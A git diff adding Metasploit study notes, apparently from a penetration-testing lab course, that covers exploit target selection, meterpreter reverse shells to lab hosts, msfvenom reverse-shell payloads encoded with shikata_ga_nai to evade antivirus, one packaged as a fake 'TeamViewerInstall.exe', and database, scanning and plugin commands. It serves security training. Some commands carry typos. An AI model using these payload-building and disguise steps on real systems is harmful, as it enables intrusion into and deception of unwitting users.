@@ -121,6 +121,69 @@ msf6 > setg RHOSTS 10.10.10.40
 run
 meterpreter > shell
 C:\Windows\system32> whoami
+
+msf6 > show targets
+msf6 > set target 6
+
+msf6 > show payloads
+grep meterpreter show payloads
+grep -c meterpreter show payloads
+# 14
+grep meterpreter grep reverse_tcp show payloads
+show options
+set payload windows/meterpreter/reverse_tcp
+set ppayload 15
+ifconfig
+set LHOST 10.10.14.15
+set RHOSTS 10.10.10.40
+rrun
+meterpreter > getuid
+meterpreter > help
+msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+set payload 15
+show encoders
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+msf-virustotal -k <API key> -f TeamViewerInstall.ex
+
+sudo service postgresql status
+sudo systemctl start postgresql
+sudo msfdb init
+sudo msfdb status
+sudo msfdb init
+sudo msfdb run
+msfdb reinit
+cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+msfconsole -q
+msf6 > db_status
+msf6 > help database
+msf6 > workspace
+msff6 > workspace -a Target_1
+cat Target.nmap
+db_import target.xml
+hosts
+services
+db_nmap -sV -sS 10.10.10.8
+hosts
+services
+db_export -h
+db_export -f xml backup.xml
+hosts -h
+services -h
+creds -h
+loot -h
+ls /usr/share/metasploit-framework/plugins
+msf6 > load nessus
+msf6 > nessus_help
+msf6 > load Plugin_That_Doess_Not_Exist
+git clone https://github.com/darkoperator/Metasploit-Plugins
+ls Metasploit-Plugins
+sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
+msfconsole -q
+msf6 > load penttest
+
 ```
 
 ```bash
